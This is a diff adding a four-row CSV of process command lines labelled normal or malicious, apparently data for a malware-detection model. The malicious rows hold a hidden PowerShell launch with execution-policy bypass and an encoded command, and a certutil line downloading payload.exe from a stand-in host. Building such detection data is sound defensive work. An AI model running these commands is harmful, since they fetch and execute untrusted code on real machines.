@@ -1,0 +1,5 @@
+timestamp,process_name,command_line,label
+2025-01-01 10:00:01,git.exe,git status,normal
+2025-01-01 10:05:22,chrome.exe,chrome.exe --new-window https://google.com,normal
+2025-01-01 11:15:00,powershell.exe,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABhID0A... ,malicious
+2025-01-01 12:30:45,certutil.exe,certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe,malicious
